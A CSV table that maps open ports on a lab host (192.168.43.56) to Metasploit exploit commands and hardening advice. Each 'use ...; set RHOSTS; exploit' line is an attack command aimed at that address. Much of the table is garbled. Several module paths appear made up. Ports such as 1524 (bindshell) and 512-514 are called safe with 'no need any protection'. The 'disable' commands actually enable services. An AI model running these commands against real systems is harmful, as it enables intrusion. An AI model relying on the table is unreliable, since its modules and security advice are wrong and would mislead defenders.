"PORT","SERVICE","EXPLOIT SCRIPTS / TOOLS","EXPLOIT CODE (Full Metasploit or relevant script)","SECURITY RECOMMENDATIONS with Linux Codes if needed"
"21/tcp","ftp","vsftpd_2_3_4_exploit.py, Metasploit exploit/unix/ftp/vsftpd_234_backdoor","use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.43.56; exploit","Update vsftpd to the latest version: sudo apt-get update && sudo apt-get install vsftpd"
"22/tcp","ssh","No exploit available","Base on our database, No need any protection.","Configure SSH to use strong passwords and disable root login: sudo nano /etc/ssh/sshd_config"
"23/tcp","telnet","telnet_brute.py, Metasploit exploit/unix/telnet/telnet_encrypt","use exploit/unix/telnet/telnet_encrypt; set RHOSTS 192.168.43.56; exploit","Disable telnet and use SSH instead: sudo apt-get remove telnetd"
"25/tcp","smtp","postfix_smtp_exploit.py, Metasploit exploit/unix/smtp/postfix_smtp_enumusers","use exploit/unix/smtp/postfix_smtp_enumusers; set RHOSTS 192.168.43.56; exploit","Configure Postfix to use authentication and encryption: sudo nano /etc/postfix/main.cf"
"53/tcp","domain","bind_9_4_2_exploit.py, Metasploit exploit/unix/dns/bind_942_dname","use exploit/unix/dns/bind_942_dname; set RHOSTS 192.168.43.56; exploit","Update BIND to the latest version: sudo apt-get update && sudo apt-get install bind9"
"80/tcp","http","apache_httpd_2_2_8_exploit.py, Metasploit exploit/unix/webapp/apache_chunked","use exploit/unix/webapp/apache_chunked; set RHOSTS 192.168.43.56; exploit","Update Apache to the latest version: sudo apt-get update && sudo apt-get install apache2"
"111/tcp","rpcbind","No exploit available","Base on our database, No need any protection.","Configure rpcbind to use authentication: sudo nano /etc/default/rpcbind"
"139/tcp","netbios-ssn","samba_3_4_7_exploit.py, Metasploit exploit/unix/smb/samba_usermap_script","use exploit/unix/smb/samba_usermap_script; set RHOSTS 192.168.43.56; exploit","Update Samba to the latest version: sudo apt-get update && sudo apt-get install samba"
"445/tcp","netbios-ssn","samba_3_4_7_exploit.py, Metasploit exploit/unix/smb/samba_usermap_script","use exploit/unix/smb/samba_usermap_script; set RHOSTS 192.168.43.56; exploit","Update Samba to the latest version: sudo apt-get update && sudo apt-get install samba"
"512/tcp","exec","No exploit available","Base on our database, No need any protection.","Disable exec service: sudo update-rc.d exec defaults"
"513/tcp","login","No exploit available","Base on our database, No need any protection.","Disable login service: sudo update-rc.d login defaults"
"514/tcp","shell","No exploit available","Base on our database, No need any protection.","Disable shell service: sudo update-rc.d shell defaults"
"1099/tcp","java-rmi","java_rmi_exploit.py, Metasploit exploit/multi/misc/java_rmi_server","use exploit/multi/misc/java_rmi_server; set RHOSTS 192.168.43.56; exploit","Disable Java RMI service: sudo update-rc.d java-rmi defaults"
"1524/tcp","bindshell","No exploit available","Base on our database, No need any protection.","Disable bindshell service: sudo update-rc.d bindshell defaults"
"2049/tcp","nfs","nfs_exploit.py, Metasploit exploit/unix/nfs/nfs_mount","use exploit/unix/nfs/nfs_mount; set RHOSTS 192.168.43.56; exploit","Configure NFS to use authentication and encryption: sudo nano /etc/exports"
"2121/tcp","ftp","proftpd_1_3_1_exploit.py, Metasploit exploit/unix/ftp/proftpd_131_backdoor","use exploit/unix/ftp/proftpd_131_backdoor; set RHOSTS 192.168.43.56; exploit","Update ProFTPD to the latest version: sudo apt-get update && sudo apt-get install proftpd"
"3306/tcp","mysql","mysql_5_0_51a_exploit.py, Metasploit exploit/unix/mysql/mysql_old_password","use exploit/unix/mysql/mysql_old_password; set RHOSTS 192.168.43.56; exploit","Update MySQL to the latest version: sudo apt-get update && sudo apt-get install mysql-server"
"5432/tcp","postgresql","postgresql_8_3_0_exploit.py, Metasploit exploit/unix/postgres/postgres_payload","use exploit/unix/postgres/postgres_payload; set RHOSTS 192.168.43.56; exploit","Update PostgreSQL to the latest version: sudo apt-get update && sudo apt-get install postgresql"
"5900/tcp","vnc","vnc_3_3_exploit.py, Metasploit exploit/unix/vnc/vnc_password","use exploit/unix/vnc/vnc_password; set RHOSTS 192.168.43.56; exploit","Configure VNC to use strong passwords and encryption: sudo nano /etc/vnc.conf"
"6000/tcp","X11","No exploit available","Base on our database, No need any protection.","Configure X11 to use authentication and encryption: sudo nano /etc/X11/Xwrapper.config"
"6667/tcp","irc","unrealircd_exploit.py, Metasploit exploit/unix/irc/unreal_ircd_3281_backdoor","use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.43.56; exploit","Update UnrealIRCd to the latest version: sudo apt-get update && sudo apt-get install unrealircd"
"8009/tcp","ajp13","apache_jserv_exploit.py, Metasploit exploit/unix/webapp/apache_jserv","use exploit/unix/webapp/apache_jserv; set RHOSTS 192.168.43.56; exploit","Configure Apache Jserv to use authentication and encryption: sudo nano /etc/apache2/conf.d/jserv.conf"
"8180/tcp","http","tomcat_6_0_18_exploit.py, Metasploit exploit/unix/webapp/tomcat_mgr_deploy","use exploit/unix/webapp/tomcat_mgr_deploy; set RHOSTS 192.168.43.56; exploit","Update Tomcat to the latest version: sudo apt-get update && sudo apt-get install tomcat6"